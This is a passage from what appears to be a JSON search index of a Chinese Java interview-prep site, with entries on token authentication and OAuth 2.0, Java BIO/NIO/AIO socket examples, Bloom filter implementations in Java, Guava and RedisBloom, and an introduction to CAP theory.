如何基于 Token 进行身份验证？    在基于 Token 进行身份验证的的应用程序中，服务器通过Payload、Header和一个密钥(secret)创建令牌（Token）并将 Token 发送给客户端，客户端将 Token 保存在 Cookie 或者 localStorage 里面，以后客户端发出的所有请求都会携带这个令牌。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP Header 的 Authorization 字段中：Authorization: Bearer Token。\n 用户向服务器发送用户名和密码用于登陆系统。 身份验证服务响应并返回了签名的 JWT，上面包含了用户是谁的内容。 用户以后每次向后端发请求都在 Header 中带上 JWT。 服务端检查 JWT 并从中获取用户相关信息。  什么是 SSO?    SSO(Single Sign On)即单点登录说的是用户登陆多个子系统的其中一个就有权访问与其相关的其他系统。举个例子我们在登陆了京东金融之后，我们同时也成功登陆京东的京东超市、京东国际、京东生鲜等子系统。\n什么是 OAuth 2.0？    OAuth 是一个行业的标准授权协议，主要用来授权第三方应用获取有限的权限。而 OAuth 2.0 是对 OAuth 1.0 的完全重新设计，OAuth 2.0 更快，更容易实现，OAuth 1.0 已经被废弃。详情请见：rfc6749。\n实际上它就是一种授权机制，它的最终目的是为第三方应用颁发一个有时效性的令牌 Token，使得第三方应用能够通过该令牌获取相关的资源。\nOAuth 2.0 比较常用的场景就是第三方登录，当你的网站接入了第三方登录的时候一般就是使用的 OAuth 2.0 协议。\n另外，现在 OAuth 2.0 也常见于支付场景（微信支付、支付宝支付）和开发平台（微信开放平台、阿里开放平台等等）。\n微信支付账户相关参数：\n下图是 Slack OAuth 2.0 第三方登录的示意图：\n推荐阅读：\n OAuth 2.0 的一个简单解释 10 分钟理解什么是 OAuth 2.0 协议 OAuth 2.0 的四种方式 GitHub OAuth 第三方登录示例教程  "},{"id":137,"href":"/java/basis/BIONIOAIO%E6%80%BB%E7%BB%93/","title":"BIO,NIO,AIO总结","parent":"basis","content":"熟练掌握 BIO,NIO,AIO 的基本概念以及一些常见问题是你准备面试的过程中不可或缺的一部分，另外这些知识点也是你学习 Netty 的基础。\n BIO,NIO,AIO 总结  1. BIO (Blocking I/O)  1.1 传统 BIO 1.2 伪异步 IO 1.3 代码示例 1.4 总结   2. NIO (New I/O)  2.1 NIO 简介 2.2 NIO的特性/NIO与IO区别  1)Non-blocking IO（非阻塞IO） 2)Buffer(缓冲区) 3)Channel (通道) 4)Selectors(选择器)   2.3 NIO 读数据和写数据方式 2.4 NIO核心组件简单介绍 2.5 代码示例   3. AIO (Asynchronous I/O) 参考    BIO,NIO,AIO 总结    Java 中的 BIO、NIO和 AIO 理解为是 Java 语言对操作系统的各种 IO 模型的封装。程序员在使用这些 API 的时候，不需要关心操作系统层面的知识，也不需要根据不同操作系统编写不同的代码。只需要使用Java的API就可以了。\n在讲 BIO,NIO,AIO 之前先来回顾一下这样几个概念：同步与异步，阻塞与非阻塞。\n关于同步和异步的概念解读困扰着很多程序员，大部分的解读都会带有自己的一点偏见。参考了 Stackoverflow相关问题后对原有答案进行了进一步完善：\n When you execute something synchronously, you wait for it to finish before moving on to another task. When you execute something asynchronously, you can move on to another task before it finishes.\n当你同步执行某项任务时，你需要等待其完成才能继续执行其他任务。当您异步执行某项任务时，你可以在它完成之前继续执行其他任务。\n  同步 ：两个同步任务相互依赖，并且一个任务必须以依赖于另一任务的某种方式执行。 比如在A-\u0026gt;B事件模型中，你需要先完成 A 才能执行B。 再换句话说，同步调用中被调用者未处理完请求之前，调用不返回，调用者会一直等待结果的返回。 异步： 两个异步的任务是完全独立的，一方的执行不需要等待另外一方的执行。再换句话说，异步调用中一调用就返回结果不需要等待结果返回，当结果返回的时候通过回调函数或者其他方式拿着结果再做相关事情。  阻塞和非阻塞\n 阻塞： 阻塞就是发起一个请求，调用者一直等待请求结果返回，也就是当前线程会被挂起，无法从事其他任务，只有当条件就绪才能继续。 非阻塞： 非阻塞就是发起一个请求，调用者不用一直等着结果返回，可以先去干其他事情。  如何区分 “同步/异步 ”和 “阻塞/非阻塞” 呢？\n同步/异步是从行为角度描述事物的，而阻塞和非阻塞描述的当前事物的状态（等待调用结果时的状态）。\n1. BIO (Blocking I/O)    同步阻塞I/O模式，数据的读取写入必须阻塞在一个线程内等待其完成。\n1.1 传统 BIO    BIO通信（一请求一应答）模型图如下(图源网络，原出处不明)：\n采用 BIO 通信模型 的服务端，通常由一个独立的 Acceptor 线程负责监听客户端的连接。我们一般通过在while(true) 循环中服务端会调用 accept() 方法等待接收客户端的连接的方式监听请求，一旦接收到一个连接请求，就可以建立通信套接字在这个通信套接字上进行读写操作，此时不能再接收其他客户端连接请求，只能等待同当前连接的客户端的操作执行完成， 不过可以通过多线程来支持多个客户端的连接，如上图所示。\n如果要让 BIO 通信模型 能够同时处理多个客户端请求，就必须使用多线程（主要原因是socket.accept()、socket.read()、socket.write() 涉及的三个主要函数都是同步阻塞的），也就是说它在接收到客户端连接请求之后为每个客户端创建一个新的线程进行链路处理，处理完成之后，通过输出流返回应答给客户端，线程销毁。这就是典型的 一请求一应答通信模型 。我们可以设想一下如果这个连接不做任何事情的话就会造成不必要的线程开销，不过可以通过 线程池机制 改善，线程池还可以让线程的创建和回收成本相对较低。使用FixedThreadPool 可以有效的控制了线程的最大数量，保证了系统有限的资源的控制，实现了N(客户端请求数量):M(处理客户端请求的线程数量)的伪异步I/O模型（N 可以远远大于 M），下面一节\u0026quot;伪异步 BIO\u0026quot;中会详细介绍到。\n我们再设想一下当客户端并发访问量增加后这种模型会出现什么问题？\n在 Java 虚拟机中，线程是宝贵的资源，线程的创建和销毁成本很高，除此之外，线程的切换成本也是很高的。尤其在 Linux 这样的操作系统中，线程本质上就是一个进程，创建和销毁线程都是重量级的系统函数。如果并发访问量增加会导致线程数急剧膨胀可能会导致线程堆栈溢出、创建新线程失败等问题，最终导致进程宕机或者僵死，不能对外提供服务。\n1.2 伪异步 IO    为了解决同步阻塞I/O面临的一个链路需要一个线程处理的问题，后来有人对它的线程模型进行了优化一一一后端通过一个线程池来处理多个客户端的请求接入，形成客户端个数M：线程池最大线程数N的比例关系，其中M可以远远大于N.通过线程池可以灵活地调配线程资源，设置线程的最大值，防止由于海量并发接入导致线程耗尽。\n伪异步IO模型图(图源网络，原出处不明)：\n采用线程池和任务队列可以实现一种叫做伪异步的 I/O 通信框架，它的模型图如上图所示。当有新的客户端接入时，将客户端的 Socket 封装成一个Task（该任务实现java.lang.Runnable接口）投递到后端的线程池中进行处理，JDK 的线程池维护一个消息队列和 N 个活跃线程，对消息队列中的任务进行处理。由于线程池可以设置消息队列的大小和最大线程数，因此，它的资源占用是可控的，无论多少个客户端并发访问，都不会导致资源的耗尽和宕机。\n伪异步I/O通信框架采用了线程池实现，因此避免了为每个请求都创建一个独立线程造成的线程资源耗尽问题。不过因为它的底层仍然是同步阻塞的BIO模型，因此无法从根本上解决问题。\n1.3 代码示例    下面代码中演示了BIO通信（一请求一应答）模型。我们会在客户端创建多个线程依次连接服务端并向其发送\u0026quot;当前时间+:hello world\u0026quot;，服务端会为每个客户端线程创建一个线程来处理。代码示例出自闪电侠的博客，原地址如下：\nhttps://www.jianshu.com/p/a4e03835921a\n客户端\n/** * * @author 闪电侠 * @date 2018年10月14日 * @Description:客户端 */ public class IOClient { public static void main(String[] args) { // TODO 创建多个线程，模拟多个客户端连接服务端  new Thread(() -\u0026gt; { try { Socket socket = new Socket(\u0026#34;127.0.0.1\u0026#34;, 3333); while (true) { try { socket.getOutputStream().write((new Date() + \u0026#34;: hello world\u0026#34;).getBytes()); Thread.sleep(2000); } catch (Exception e) { } } } catch (IOException e) { } }).start(); } } 服务端\n/** * @author 闪电侠 * @date 2018年10月14日 * @Description: 服务端 */ public class IOServer { public static void main(String[] args) throws IOException { // TODO 服务端处理客户端连接请求  ServerSocket serverSocket = new ServerSocket(3333); // 接收到客户端连接请求之后为每个客户端创建一个新的线程进行链路处理  new Thread(() -\u0026gt; { while (true) { try { // 阻塞方法获取新的连接  Socket socket = serverSocket.accept(); // 每一个新的连接都创建一个线程，负责读取数据  new Thread(() -\u0026gt; { try { int len; byte[] data = new byte[1024]; InputStream inputStream = socket.getInputStream(); // 按字节流方式读取数据  while ((len = inputStream.read(data)) != -1) { System.out.println(new String(data, 0, len)); } } catch (IOException e) { } }).start(); } catch (IOException e) { } } }).start(); } } 1.4 总结    在活动连接数不是特别高（小于单机1000）的情况下，这种模型是比较不错的，可以让每一个连接专注于自己的 I/O 并且编程模型简单，也不用过多考虑系统的过载、限流等问题。线程池本身就是一个天然的漏斗，可以缓冲一些系统处理不了的连接或请求。但是，当面对十万甚至百万级连接的时候，传统的 BIO 模型是无能为力的。因此，我们需要一种更高效的 I/O 处理模型来应对更高的并发量。\n2. NIO (New I/O)    2.1 NIO 简介    NIO是一种同步非阻塞的I/O模型，在Java 1.4 中引入了 NIO 框架，对应 java.nio 包，提供了 Channel , Selector，Buffer等抽象。\nNIO中的N可以理解为Non-blocking，不单纯是New。它支持面向缓冲的，基于通道的I/O操作方法。 NIO提供了与传统BIO模型中的 Socket 和 ServerSocket 相对应的 SocketChannel 和 ServerSocketChannel 两种不同的套接字通道实现,两种通道都支持阻塞和非阻塞两种模式。阻塞模式使用就像传统中的支持一样，比较简单，但是性能和可靠性都不好；非阻塞模式正好与之相反。对于低负载、低并发的应用程序，可以使用同步阻塞I/O来提升开发速率和更好的维护性；对于高负载、高并发的（网络）应用，应使用 NIO 的非阻塞模式来开发。\n2.2 NIO的特性/NIO与IO区别    如果是在面试中回答这个问题，我觉得首先肯定要从 NIO 流是非阻塞 IO 而 IO 流是阻塞 IO 说起。然后，可以从 NIO 的3个核心组件/特性为 NIO 带来的一些改进来分析。如果，你把这些都回答上了我觉得你对于 NIO 就有了更为深入一点的认识，面试官问到你这个问题，你也能很轻松的回答上来了。\n1)Non-blocking IO（非阻塞IO）    IO流是阻塞的，NIO流是不阻塞的。\nJava NIO使我们可以进行非阻塞IO操作。比如说，单线程中从通道读取数据到buffer，同时可以继续做别的事情，当数据读取到buffer中后，线程再继续处理数据。写数据也是一样的。另外，非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。\nJava IO的各种流是阻塞的。这意味着，当一个线程调用 read() 或 write() 时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了\n2)Buffer(缓冲区)    IO 面向流(Stream oriented)，而 NIO 面向缓冲区(Buffer oriented)。\nBuffer是一个对象，它包含一些要写入或者要读出的数据。在NIO类库中加入Buffer对象，体现了新库与原I/O的一个重要区别。在面向流的I/O中·可以将数据直接写入或者将数据直接读到 Stream 对象中。虽然 Stream 中也有 Buffer 开头的扩展类，但只是流的包装类，还是从流读到缓冲区，而 NIO 却是直接读到 Buffer 中进行操作。\n在NIO库中，所有数据都是用缓冲区处理的。在读取数据时，它是直接读到缓冲区中的; 在写入数据时，写入到缓冲区中。任何时候访问NIO中的数据，都是通过缓冲区进行操作。\n最常用的缓冲区是 ByteBuffer,一个 ByteBuffer 提供了一组功能用于操作 byte 数组。除了ByteBuffer,还有其他的一些缓冲区，事实上，每一种Java基本类型（除了Boolean类型）都对应有一种缓冲区。\n3)Channel (通道)    NIO 通过Channel（通道） 进行读写。\n通道是双向的，可读也可写，而流的读写是单向的。无论读写，通道只能和Buffer交互。因为 Buffer，通道可以异步地读写。\n4)Selector (选择器)    NIO有选择器，而IO没有。\n选择器用于使用单个线程处理多个通道。因此，它需要较少的线程来处理这些通道。线程之间的切换对于操作系统来说是昂贵的。 因此，为了提高系统效率选择器是有用的。\n2.3 NIO 读数据和写数据方式    通常来说NIO中的所有IO都是从 Channel（通道） 开始的。\n 从通道进行数据读取 ：创建一个缓冲区，然后请求通道读取数据。 从通道进行数据写入 ：创建一个缓冲区，填充数据，并要求通道写入数据。  数据读取和写入操作图示：\n2.4 NIO核心组件简单介绍    NIO 包含下面几个核心的组件：\n Channel(通道) Buffer(缓冲区) Selector(选择器)  整个NIO体系包含的类远远不止这三个，只能说这三个是NIO体系的“核心API”。我们上面已经对这三个概念进行了基本的阐述，这里就不多做解释了。\n2.5 代码示例    代码示例出自闪电侠的博客，原地址如下：\nhttps://www.jianshu.com/p/a4e03835921a\n客户端 IOClient.java 的代码不变，我们对服务端使用 NIO 进行改造。以下代码较多而且逻辑比较复杂，大家看看就好。\n/** * * @author 闪电侠 * @date 2019年2月21日 * @Description: NIO 改造后的服务端 */ public class NIOServer { public static void main(String[] args) throws IOException { // 1. serverSelector负责轮询是否有新的连接，服务端监测到新的连接之后，不再创建一个新的线程，  // 而是直接将新连接绑定到clientSelector上，这样就不用 IO 模型中 1w 个 while 循环在死等  Selector serverSelector = Selector.open(); // 2. clientSelector负责轮询连接是否有数据可读  Selector clientSelector = Selector.open(); new Thread(() -\u0026gt; { try { // 对应IO编程中服务端启动  ServerSocketChannel listenerChannel = ServerSocketChannel.open(); listenerChannel.socket().bind(new InetSocketAddress(3333)); listenerChannel.configureBlocking(false); listenerChannel.register(serverSelector, SelectionKey.OP_ACCEPT); while (true) { // 监测是否有新的连接，这里的1指的是阻塞的时间为 1ms  if (serverSelector.select(1) \u0026gt; 0) { Set\u0026lt;SelectionKey\u0026gt; set = serverSelector.selectedKeys(); Iterator\u0026lt;SelectionKey\u0026gt; keyIterator = set.iterator(); while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isAcceptable()) { try { // (1) 每来一个新连接，不需要创建一个线程，而是直接注册到clientSelector  SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept(); clientChannel.configureBlocking(false); clientChannel.register(clientSelector, SelectionKey.OP_READ); } finally { keyIterator.remove(); } } } } } } catch (IOException ignored) { } }).start(); new Thread(() -\u0026gt; { try { while (true) { // (2) 批量轮询是否有哪些连接有数据可读，这里的1指的是阻塞的时间为 1ms  if (clientSelector.select(1) \u0026gt; 0) { Set\u0026lt;SelectionKey\u0026gt; set = clientSelector.selectedKeys(); Iterator\u0026lt;SelectionKey\u0026gt; keyIterator = set.iterator(); while (keyIterator.hasNext()) { SelectionKey key = keyIterator.next(); if (key.isReadable()) { try { SocketChannel clientChannel = (SocketChannel) key.channel(); ByteBuffer byteBuffer = ByteBuffer.allocate(1024); // (3) 面向 Buffer  clientChannel.read(byteBuffer); byteBuffer.flip(); System.out.println( Charset.defaultCharset().newDecoder().decode(byteBuffer).toString()); } finally { keyIterator.remove(); key.interestOps(SelectionKey.OP_READ); } } } } } } catch (IOException ignored) { } }).start(); } } 为什么大家都不愿意用 JDK 原生 NIO 进行开发呢？从上面的代码中大家都可以看出来，是真的难用！除了编程复杂、编程模型难之外，它还有以下让人诟病的问题：\n JDK 的 NIO 底层由 epoll 实现，该实现饱受诟病的空轮询 bug 会导致 cpu 飙升 100% 项目庞大之后，自行实现的 NIO 很容易出现各类 bug，维护成本较高，上面这一坨代码我都不能保证没有 bug  Netty 的出现很大程度上改善了 JDK 原生 NIO 所存在的一些让人难以忍受的问题。\n3. AIO (Asynchronous I/O)    AIO 也就是 NIO 2。在 Java 7 中引入了 NIO 的改进版 NIO 2,它是异步非阻塞的IO模型。异步 IO 是基于事件和回调机制实现的，也就是应用操作之后会直接返回，不会堵塞在那里，当后台处理完成，操作系统会通知相应的线程进行后续的操作。\nAIO 是异步IO的缩写，虽然 NIO 在网络操作中，提供了非阻塞的方法，但是 NIO 的 IO 行为还是同步的。对于 NIO 来说，我们的业务线程是在 IO 操作准备好时，得到通知，接着就由这个线程自行进行 IO 操作，IO操作本身是同步的。（除了 AIO 其他的 IO 类型都是同步的，这一点可以从底层IO线程模型解释，推荐一篇文章：《漫话：如何给女朋友解释什么是Linux的五种IO模型？》 ）\n查阅网上相关资料，我发现就目前来说 AIO 的应用还不是很广泛，Netty 之前也尝试使用过 AIO，不过又放弃了。\n参考     《Netty 权威指南》第二版 https://zhuanlan.zhihu.com/p/23488863 (美团技术团队)  "},{"id":138,"href":"/cs-basics/data-structure/bloom-filter/","title":"bloom-filter","parent":"data-structure","content":"海量数据处理以及缓存穿透这两个场景让我认识了 布隆过滤器 ，我查阅了一些资料来了解它，但是很多现成资料并不满足我的需求，所以就决定自己总结一篇关于布隆过滤器的文章。希望通过这篇文章让更多人了解布隆过滤器，并且会实际去使用它！\n下面我们将分为几个方面来介绍布隆过滤器：\n 什么是布隆过滤器？ 布隆过滤器的原理介绍。 布隆过滤器使用场景。 通过 Java 编程手动实现布隆过滤器。 利用 Google 开源的 Guava 中自带的布隆过滤器。 Redis 中的布隆过滤器。  1.什么是布隆过滤器？    首先，我们需要了解布隆过滤器的概念。\n布隆过滤器（Bloom Filter）是一个叫做 Bloom 的老哥于 1970 年提出的。我们可以把它看作由二进制向量（或者说位数组）和一系列随机映射函数（哈希函数）两部分组成的数据结构。相比于我们平时常用的的 List、Map 、Set 等数据结构，它占用空间更少并且效率更高，但是缺点是其返回的结果是概率性的，而不是非常准确的。理论情况下添加到集合中的元素越多，误报的可能性就越大。并且，存放在布隆过滤器的数据不容易删除。\n位数组中的每个元素都只占用 1 bit ，并且每个元素只能是 0 或者 1。这样申请一个 100w 个元素的位数组只占用 1000000Bit / 8 = 125000 Byte = 125000/1024 kb ≈ 122kb 的空间。\n总结：一个名叫 Bloom 的人提出了一种来检索元素是否在给定大集合中的数据结构，这种数据结构是高效且性能很好的，但缺点是具有一定的错误识别率和删除难度。并且，理论情况下，添加到集合中的元素越多，误报的可能性就越大。\n2.布隆过滤器的原理介绍    当一个元素加入布隆过滤器中的时候，会进行如下操作：\n 使用布隆过滤器中的哈希函数对元素值进行计算，得到哈希值（有几个哈希函数得到几个哈希值）。 根据得到的哈希值，在位数组中把对应下标的值置为 1。  当我们需要判断一个元素是否存在于布隆过滤器的时候，会进行如下操作：\n 对给定元素再次进行相同的哈希计算； 得到值之后判断位数组中的每个元素是否都为 1，如果值都为 1，那么说明这个值在布隆过滤器中，如果存在一个值不为 1，说明该元素不在布隆过滤器中。  举个简单的例子：\n如图所示，当字符串存储要加入到布隆过滤器中时，该字符串首先由多个哈希函数生成不同的哈希值，然后将对应的位数组的下标设置为 1（当位数组初始化时，所有位置均为 0）。当第二次存储相同字符串时，因为先前的对应位置已设置为 1，所以很容易知道此值已经存在（去重非常方便）。\n如果我们需要判断某个字符串是否在布隆过滤器中时，只需要对给定字符串再次进行相同的哈希计算，得到值之后判断位数组中的每个元素是否都为 1，如果值都为 1，那么说明这个值在布隆过滤器中，如果存在一个值不为 1，说明该元素不在布隆过滤器中。\n不同的字符串可能哈希出来的位置相同，这种情况我们可以适当增加位数组大小或者调整我们的哈希函数。\n综上，我们可以得出：布隆过滤器说某个元素存在，小概率会误判。布隆过滤器说某个元素不在，那么这个元素一定不在。\n3.布隆过滤器使用场景     判断给定数据是否存在：比如判断一个数字是否存在于包含大量数字的数字集中（数字集很大，5 亿以上！）、 防止缓存穿透（判断请求的数据是否有效避免直接绕过缓存请求数据库）等等、邮箱的垃圾邮件过滤、黑名单功能等等。 去重：比如爬给定网址的时候对已经爬取过的 URL 去重。  4.通过 Java 编程手动实现布隆过滤器    我们上面已经说了布隆过滤器的原理，知道了布隆过滤器的原理之后就可以自己手动实现一个了。\n如果你想要手动实现一个的话，你需要：\n 一个合适大小的位数组保存数据 几个不同的哈希函数 添加元素到位数组（布隆过滤器）的方法实现 判断给定元素是否存在于位数组（布隆过滤器）的方法实现。  下面给出一个我觉得写的还算不错的代码（参考网上已有代码改进得到，对于所有类型对象皆适用）：\nimport java.util.BitSet; public class MyBloomFilter { /** * 位数组的大小 */ private static final int DEFAULT_SIZE = 2 \u0026lt;\u0026lt; 24; /** * 通过这个数组可以创建 6 个不同的哈希函数 */ private static final int[] SEEDS = new int[]{3, 13, 46, 71, 91, 134}; /** * 位数组。数组中的元素只能是 0 或者 1 */ private BitSet bits = new BitSet(DEFAULT_SIZE); /** * 存放包含 hash 函数的类的数组 */ private SimpleHash[] func = new SimpleHash[SEEDS.length]; /** * 初始化多个包含 hash 函数的类的数组，每个类中的 hash 函数都不一样 */ public MyBloomFilter() { // 初始化多个不同的 Hash 函数  for (int i = 0; i \u0026lt; SEEDS.length; i++) { func[i] = new SimpleHash(DEFAULT_SIZE, SEEDS[i]); } } /** * 添加元素到位数组 */ public void add(Object value) { for (SimpleHash f : func) { bits.set(f.hash(value), true); } } /** * 判断指定元素是否存在于位数组 */ public boolean contains(Object value) { boolean ret = true; for (SimpleHash f : func) { ret = ret \u0026amp;\u0026amp; bits.get(f.hash(value)); } return ret; } /** * 静态内部类。用于 hash 操作！ */ public static class SimpleHash { private int cap; private int seed; public SimpleHash(int cap, int seed) { this.cap = cap; this.seed = seed; } /** * 计算 hash 值 */ public int hash(Object value) { int h; return (value == null) ? 0 : Math.abs(seed * (cap - 1) \u0026amp; ((h = value.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16))); } } } 测试：\nString value1 = \u0026#34;https://javaguide.cn/\u0026#34;; String value2 = \u0026#34;https://github.com/Snailclimb\u0026#34;; MyBloomFilter filter = new MyBloomFilter(); System.out.println(filter.contains(value1)); System.out.println(filter.contains(value2)); filter.add(value1); filter.add(value2); System.out.println(filter.contains(value1)); System.out.println(filter.contains(value2)); Output:\nfalse false true true 测试：\nInteger value1 = 13423; Integer value2 = 22131; MyBloomFilter filter = new MyBloomFilter(); System.out.println(filter.contains(value1)); System.out.println(filter.contains(value2)); filter.add(value1); filter.add(value2); System.out.println(filter.contains(value1)); System.out.println(filter.contains(value2)); Output:\nfalse false true true 5.利用 Google 开源的 Guava 中自带的布隆过滤器    自己实现的目的主要是为了让自己搞懂布隆过滤器的原理，Guava 中布隆过滤器的实现算是比较权威的，所以实际项目中我们不需要手动实现一个布隆过滤器。\n首先我们需要在项目中引入 Guava 的依赖：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.google.guava\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;guava\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;28.0-jre\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 实际使用如下：\n我们创建了一个最多存放 最多 1500 个整数的布隆过滤器，并且我们可以容忍误判的概率为百分之（0.01）\n// 创建布隆过滤器对象 BloomFilter\u0026lt;Integer\u0026gt; filter = BloomFilter.create( Funnels.integerFunnel(), 1500, 0.01); // 判断指定元素是否存在 System.out.println(filter.mightContain(1)); System.out.println(filter.mightContain(2)); // 将元素添加进布隆过滤器 filter.put(1); filter.put(2); System.out.println(filter.mightContain(1)); System.out.println(filter.mightContain(2)); 在我们的示例中，当mightContain() 方法返回 true 时，我们可以 99％确定该元素在过滤器中，当过滤器返回 false 时，我们可以 100％确定该元素不存在于过滤器中。\nGuava 提供的布隆过滤器的实现还是很不错的（想要详细了解的可以看一下它的源码实现），但是它有一个重大的缺陷就是只能单机使用（另外，容量扩展也不容易），而现在互联网一般都是分布式的场景。为了解决这个问题，我们就需要用到 Redis 中的布隆过滤器了。\n6.Redis 中的布隆过滤器    6.1 介绍    Redis v4.0 之后有了 Module（模块/插件） 功能，Redis Modules 让 Redis 可以使用外部模块扩展其功能 。布隆过滤器就是其中的 Module。详情可以查看 Redis 官方对 Redis Modules 的介绍 ：https://redis.io/modules\n另外，官网推荐了一个 RedisBloom 作为 Redis 布隆过滤器的 Module，地址：https://github.com/RedisBloom/RedisBloom 其他还有：\n redis-lua-scaling-bloom-filter（lua 脚本实现）：https://github.com/erikdubbelboer/redis-lua-scaling-bloom-filter pyreBloom（Python 中的快速 Redis 布隆过滤器） ：https://github.com/seomoz/pyreBloom \u0026hellip;\u0026hellip;  RedisBloom 提供了多种语言的客户端支持，包括：Python、Java、JavaScript 和 PHP。\n6.2 使用 Docker 安装    如果我们需要体验 Redis 中的布隆过滤器非常简单，通过 Docker 就可以了！我们直接在 Google 搜索 docker redis bloomfilter 然后在排除广告的第一条搜素结果就找到了我们想要的答案（这是我平常解决问题的一种方式，分享一下），具体地址：https://hub.docker.com/r/redislabs/rebloom/ （介绍的很详细 ）。\n具体操作如下：\n➜ ~ docker run -p 6379:6379 --name redis-redisbloom redislabs/rebloom:latest ➜ ~ docker exec -it redis-redisbloom bash root@21396d02c252:/data# redis-cli 127.0.0.1:6379\u0026gt; 6.3 常用命令一览     注意： key : 布隆过滤器的名称，item : 添加的元素。\n  BF.ADD：将元素添加到布隆过滤器中，如果该过滤器尚不存在，则创建该过滤器。格式：BF.ADD {key} {item}。 BF.MADD : 将一个或多个元素添加到“布隆过滤器”中，并创建一个尚不存在的过滤器。该命令的操作方式BF.ADD与之相同，只不过它允许多个输入并返回多个值。格式：BF.MADD {key} {item} [item ...] 。 BF.EXISTS : 确定元素是否在布隆过滤器中存在。格式：BF.EXISTS {key} {item}。 BF.MEXISTS ： 确定一个或者多个元素是否在布隆过滤器中存在格式：BF.MEXISTS {key} {item} [item ...]。  另外，BF.RESERVE 命令需要单独介绍一下：\n这个命令的格式如下：\nBF.RESERVE {key} {error_rate} {capacity} [EXPANSION expansion]。\n下面简单介绍一下每个参数的具体含义：\n key：布隆过滤器的名称 error_rate : 期望的误报率。该值必须介于 0 到 1 之间。例如，对于期望的误报率 0.1％（1000 中为 1），error_rate 应该设置为 0.001。该数字越接近零，则每个项目的内存消耗越大，并且每个操作的 CPU 使用率越高。 capacity: 过滤器的容量。当实际存储的元素个数超过这个值之后，性能将开始下降。实际的降级将取决于超出限制的程度。随着过滤器元素数量呈指数增长，性能将线性下降。  可选参数：\n expansion：如果创建了一个新的子过滤器，则其大小将是当前过滤器的大小乘以expansion。默认扩展值为 2。这意味着每个后续子过滤器将是前一个子过滤器的两倍。  6.4 实际使用    127.0.0.1:6379\u0026gt; BF.ADD myFilter java (integer) 1 127.0.0.1:6379\u0026gt; BF.ADD myFilter javaguide (integer) 1 127.0.0.1:6379\u0026gt; BF.EXISTS myFilter java (integer) 1 127.0.0.1:6379\u0026gt; BF.EXISTS myFilter javaguide (integer) 1 127.0.0.1:6379\u0026gt; BF.EXISTS myFilter github (integer) 0 "},{"id":139,"href":"/system-design/distributed-system/CAP%E7%90%86%E8%AE%BA/","title":"CAP理论","parent":"distributed-system","content":"经历过技术面试的小伙伴想必对这个两个概念已经再熟悉不过了！\nGuide哥当年参加面试的时候，不夸张地说，只要问到分布式相关的内容，面试官几乎是必定会问这两个分布式相关的理论。\n并且，这两个理论也可以说是小伙伴们学习分布式相关内容的基础了！\n因此，小伙伴们非常非常有必要将这理论搞懂，并且能够用自己的理解给别人讲出来。\n这篇文章我会站在自己的角度对这两个概念进行解读！\n个人能力有限。如果文章有任何需要改善和完善的地方，欢迎在评论区指出，共同进步！——爱你们的Guide哥\nCAP理论    CAP 理论/定理起源于 2000年，由加州大学伯克利分校的Eric Brewer教授在分布式计算原理研讨会（PODC）上提出，因此 CAP定理又被称作 布鲁尔定理（Brewer’s theorem）\n2年后，麻省理工学院的Seth Gilbert和Nancy Lynch 发表了布鲁尔猜想的证明，CAP理论正式成为分布式领域的定理。\n简介    CAP 也就是 Consistency（一致性）、Availability（可用性）、Partition Tolerance（分区容错性） 这三个单词首字母组合。\nCAP 理论的提出者布鲁尔在提出 CAP 猜想的时候，并没有详细定义 Consistency、Availability、Partition Tolerance 三个单词的明确定义。\n因此，对于 CAP 的民间解读有很多，一般比较被大家推荐的是下面 👇 这种版本的解读。\n在理论计算机科学中，CAP 定理（CAP theorem）指出对于一个分布式系统来说，当设计读写操作时，只能同时满足以下三点中的两个：\n 一致性（Consistency） : 所有节点访问同一份最新的数据副本 可用性（Availability）: 非故障的节点在合理的时间内返回合理的响应（不是错误或者超时的响应）。 分区容错性（Partition tolerance） : 分布式系统出现网络分区的时候，仍然能够对外提供服务。  什么是网络分区？\n 分布式系统中，多个节点之前的网络本来是连通的，但是因为某些故障（比如部分节点网络出了问题）某些节点之间不连通了，整个网络就分成了几块区域，这就叫网络分区。\n 不是所谓的“3 选 2”    大部分人解释这一定律时，常常简单的表述为：“一致性、可用性、分区容忍性三者你只能同时达到其中两个，不可能同时达到”。实际上这是一个非常具有误导性质的说法，而且在 CAP 理论诞生 12 年之后，CAP 之父也在 2012 年重写了之前的论文。\n 当发生网络分区的时候，如果我们要继续服务，那么强一致性和可用性只能 2 选 1。也就是说当网络分区之后 P 是前提，决定了 P 之后才有 C 和 A 的选择。也就是说分区容错性（Partition tolerance）我们是必须要实现的。\n简而言之就是：CAP 理论中分区容错性 P 是一定要满足的，在此基础上，只能满足可用性 A 或者一致性 C。\n 因此，分布式系统理论上不可能选择 CA 架构，只能选择 CP 或者 AP 架构。 比如 ZooKeeper、HBase 就是 CP 架构，Cassandra、Eureka 就是 AP 架构，Nacos 不仅支持 CP 架构也支持 AP 架构。\n为啥不可能选择 CA 架构呢？ 举个例子：若系统出现“分区”，系统中的某个节点在进行写操作。为了保证 C， 必须要禁止其他节点的读写操作，这就和 A 发生冲突了。如果为了保证 A，其他节点的读写操作正常的话，那就和 C 发生冲突了。\n选择 CP 还是 AP 的关键在于当前的业务场景，没有定论，比如对于需要确保强一致性的场景如银行一般会选择保证 CP 。\n另外，需要补充说明的一点是： 如果网络分区正常的话（系统在绝大部分时候所处的状态），也就说不需要保证 P 的时候，C 和 A 能够同时保证。\nCAP 实际应用案例    我这里以注册中心来探讨一下 CAP 的实际应用。考虑到很多小伙伴不知道注册中心是干嘛的，这里简单以 Dubbo 为例说一说。\n下图是 Dubbo 的架构图。注册中心 Registry 在其中扮演了什么角色呢？提供了什么服务呢？\n注册中心负责服务地址的注册与查找，相当于目录服务，服务提供者和消费者只在启动时与注册中心交互，注册中心不转发请求，压力较小。\n常见的可以作为注册中心的组件有：ZooKeeper、Eureka、Nacos\u0026hellip;。\n ZooKeeper 保证的是 CP。 任何时刻对 ZooKeeper 的读请求都能得到一致性的结果，但是， ZooKeeper 